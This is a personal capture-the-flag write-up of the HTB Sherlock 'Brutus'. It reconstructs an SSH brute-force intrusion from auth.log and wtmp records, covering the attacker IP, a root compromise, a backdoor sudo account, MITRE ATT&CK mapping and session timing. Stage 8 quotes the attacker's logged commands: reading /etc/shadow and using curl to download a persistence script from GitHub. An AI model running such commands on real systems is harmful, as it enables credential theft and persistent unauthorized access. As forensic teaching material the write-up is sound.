HTB Sherlock: Brutus — My Writeup
Prepared by: iThistle
Difficulty: Very Easy | 195 XP | Solved: 14 Nov 2026

The Scenario
An SSH server on an AWS instance (running Confluence) was brute-forced. We get two forensic artifacts: the Linux authentication log and the login records. Our job: reconstruct exactly what the attacker did — how they got in, how they stayed in, and what they ran.

Artifacts
Brutus.zip (password: hacktheblue) contains:

File	What it is
auth.log	Linux auth log — SSH, sudo, account changes, cron. 385 lines.
wtmp	Binary record of every login session. Needs a parser.
utmp.py	HTB's parser for wtmp.
The zip uses AES encryption, so plain unzip fails with unsupported compression method 99. Use bsdtar (or 7z):

bash
mkdir Brutus && cd Brutus
bsdtar --passphrase hacktheblue -xf ../Brutus.zip
sha256sum auth.log wtmp utmp.py
Always verify hashes before analysis — this proves your evidence is intact and unmodified.

Lesson learned the hard way: never open log files in office software. LibreOffice reflowed 385 lines into 2 and added backslashes to every bracket. Plain text editor or terminal only.

Host: ip-172-31-35-28
Log breakdown: 104 lines are CRON (the confluence user), 257 are sshd — the incident lives in those 257.

Stage 1 — Find the Brute Force
A brute force looks like many failed logins from one source. Count failures per IP:

bash
grep 'Failed password' auth.log | grep -oE 'from [0-9.]+' | sort | uniq -c
sort must come before uniq -c — uniq only collapses adjacent identical lines.

Result: all 48 failures come from one address. Nothing else has a single failure. Two signs this was automated:

Speed: all 48 attempts fall between 06:31:33 and 06:31:42 — a 9-second window.

Usernames: the tool guessed account names too, spreading attempts across five users:

Username	Failed attempts	Exists on server?
server_adm	12	no
svc_account	11	no
admin	10	no
backup	9	yes
root	6	yes
sshd also logged MaxStartups throttling from 06:31:31 and 21 dropped connections — the attacker opened connections faster than the server would accept.

Attacker IP: 65.2.161.68

Stage 2 — Which Account Was Compromised?
Failures show attempts; Accepted lines show the result:

bash
grep 'Accepted' auth.log | grep 65.2.161.68
Time	User	Source
06:19:54	root	203.101.190.9
06:31:40	root	65.2.161.68
06:32:44	root	65.2.161.68
06:37:34	cyberjunkie	65.2.161.68
The attacker got in as root — one of the guessed accounts. cyberjunkie was never guessed; the attacker created it (Stage 5).

Distractor: 203.101.190.9 is not the attacker. It has zero failed attempts before it, logged in 12 minutes before the attack began, and wtmp shows the same address logging in as root on 2024-01-25 and 2024-02-11. That looks like legitimate admin activity — the logs can't prove who used it, but it isn't part of this intrusion.

Compromised account: root

Stage 3 — When Did the Attacker Open a Terminal?
This is the key concept of the whole challenge: auth.log records authentication (password accepted). wtmp records a session (terminal opened). They are different events, one second apart.

wtmp is binary, so use the provided parser. Force UTC — the parser prints in the machine's local timezone:

bash
TZ=UTC python3 -I utmp.py wtmp
-I stops Python importing code from the current directory — important here because that directory holds files from a downloaded archive.

Root logins from the attacker's IP in wtmp:

text
USER  2549  pts/1  root         65.2.161.68  2024/03/06 06:32:45
DEAD  2491  pts/1                            2024/03/06 06:37:24
USER  2667  pts/1  cyberjunkie  65.2.161.68  2024/03/06 06:37:35
auth.log has two root logins from this IP, but wtmp shows only one terminal. Why?

06:31:40 — the automated brute-force success. It opened and closed in the same second. No terminal.

06:32:44 — the person at the keyboard. Terminal opened one second later, at 06:32:45.

Cross-check: read the raw epoch from the binary — 1709706765 = 2024-03-06 06:32:45 UTC. Matches the parser exactly.

Answer format tip: the parser prints dates with slashes (2024/03/06). HTB wants ISO format with dashes. Don't get rejected on formatting.

Manual login: 2024-03-06 06:32:45

Stage 4 — Session Number
systemd-logind numbers every login with a New session line:

bash
grep 'New session' auth.log
Time	User	Session
06:19:54	root (other IP)	6
06:31:40	root (automated)	34
06:32:44	root (manual)	37
06:37:34	cyberjunkie	49
Root has three sessions, so the username alone is not enough — the timestamp picks the right one. Cross-check: sshd[2491] appears in auth.log and as the DEAD record in wtmp — same process, same session.

Session number: 37

Stage 5 — Persistence: New Account
Account changes are logged by the tools that make them:

bash
grep -E 'useradd|usermod|groupadd' auth.log
text
06:34:18  groupadd  new group: name=cyberjunkie, GID=1002
06:34:18  useradd   new user: name=cyberjunkie, UID=1002, GID=1002,
                    home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
06:35:15  usermod   add 'cyberjunkie' to group 'sudo'
Two things confirm this is the attacker's work:

from=/dev/pts/1 — the same terminal wtmp recorded for the manual root session. The account was created from that session.

add to group 'sudo' — that's the privilege escalation. A sudo-group member can run anything as root.

A passwd change at 06:34:26 and chfn at 06:34:31 show the account got a password and profile details within a minute of creation.

Backdoor account: cyberjunkie

Stage 6 — MITRE ATT&CK Mapping
The attacker created a local account on the machine itself — not a domain or cloud account.

Action	Technique	ID
Create local user	Create Account: Local Account	T1136.001
Add to sudo group	Account Manipulation	T1098
Use sudo for root	Abuse Elevation Control: Sudo	T1548.003
Login with valid root creds	Valid Accounts	T1078
The question asks specifically about account creation → T1136.001. The others complete the picture for a full report.

Stage 7 — When Did the First Terminal Session End?
Sessions end with a Removed session line from systemd-logind and a matching session closed from sshd:

bash
grep -E 'Removed session|session closed for user root' auth.log
text
06:37:24  sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
06:37:24  systemd-logind: Session 37 logged out.
06:37:24  systemd-logind: Removed session 37.
Duration: 06:32:44 → 06:37:24 = 4 minutes 40 seconds. The attacker disconnected themselves. wtmp agrees with a DEAD record at the same second. Ten seconds later they logged back in as cyberjunkie.

Ambiguity note: session 34 was technically the attacker's first and ended at 06:31:40 — the same second it opened. This question means the terminal session followed since Stage 3. HTB accepts that reading. In a real report, state both interpretations and justify your choice.

Session end: 2024-03-06 06:37:24

Stage 8 — The sudo Command That Downloaded a Script
sudo logs the full command line of every use:

bash
grep 'COMMAND' auth.log
text
06:37:57  cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ;
          COMMAND=/usr/bin/cat /etc/shadow
06:39:38  cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ;
          COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
First command: reads /etc/shadow — the password hashes, root-only. Credential access.

Second command: downloads a script from a public GitHub repo. This is the one the question asks for.

Honest limitation: auth.log records the download. It does not show the script being run or where it was saved. We don't claim either. The repo name suggests a persistence tool, but that's inference, not a finding.

Full sudo command:

text
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
